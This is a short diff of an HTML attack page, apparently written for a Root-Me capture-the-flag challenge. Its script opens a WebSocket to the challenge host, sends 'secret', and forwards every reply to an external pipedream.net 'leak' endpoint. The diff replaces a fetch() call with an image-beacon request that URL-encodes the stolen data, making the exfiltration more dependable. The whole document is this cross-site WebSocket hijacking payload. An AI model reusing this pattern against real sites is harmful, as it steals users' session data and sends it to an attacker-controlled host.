@@ -4,12 +4,13 @@
   <script>
     const ws = new WebSocket('ws://ctf20.root-me.org/ws');
 
-    ws.onopen = function start(event) {
+    ws.onopen = () => {
       ws.send("secret");
-    }
-    ws.onmessage = function handleReply(event) {
-      fetch('http://eo1gpdjxqwwogrz.m.pipedream.net/leak?'+event.data, {mode: 'no-cors'});
-    }
+    };
+
+    ws.onmessage = (event) => {
+      new Image().src = 'http://eo1gpdjxqwwogrz.m.pipedream.net/leak?' + encodeURIComponent(event.data);
+    };
   </script>
 </body>
-</html> 
+</html>
